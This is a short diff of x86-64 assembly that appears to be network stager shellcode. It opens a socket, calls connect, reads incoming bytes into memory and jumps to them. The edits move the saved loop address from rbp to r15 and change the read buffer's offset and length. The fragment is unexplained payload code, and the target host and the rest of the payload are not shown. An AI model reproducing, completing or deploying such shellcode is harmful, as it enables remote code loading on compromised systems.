@@ -6,9 +6,9 @@ loop:
     xor eax, eax
     push rbx
     pop rdi
-    lea rsi, [rbp + 0xd]
-    push byte 0x7f
-    pop rdx
+    lea rsi, [r15 + 0x10]
+    xor rdx, rdx
+    add dl, 0xff
     syscall
 socket:
     ; socket(2, 1, 0)
@@ -34,6 +34,6 @@ socket:
     mov al, 0x2a
     syscall
     ; store loop
-    lea rbp, [rel loop]
-    jmp rbp
+    lea r15, [rel loop]
+    jmp r15
 
